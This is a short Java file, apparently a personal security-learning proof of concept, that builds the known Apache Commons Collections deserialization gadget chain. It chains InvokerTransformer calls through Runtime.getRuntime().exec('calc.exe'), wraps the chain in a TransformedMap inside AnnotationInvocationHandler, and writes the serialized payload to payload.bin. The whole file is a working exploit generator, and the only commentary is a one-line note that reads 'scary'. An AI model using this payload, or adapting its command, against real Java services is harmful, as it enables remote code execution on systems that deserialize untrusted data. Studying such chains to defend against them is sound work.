package test.security;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * @Desc 反序列化漏洞：可怕！
 * @Author shuaijunhe
 * @CreateTime 2018/11/15 11:09
 **/
public class DeserializationBug {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {
                        String.class }, new Object[] {"calc.exe"})};

        Transformer transformedChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

//        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
//        onlyElement.setValue("foobar");
        Class c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Target.class, outerMap);

        File f = new File("payload.bin");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

}
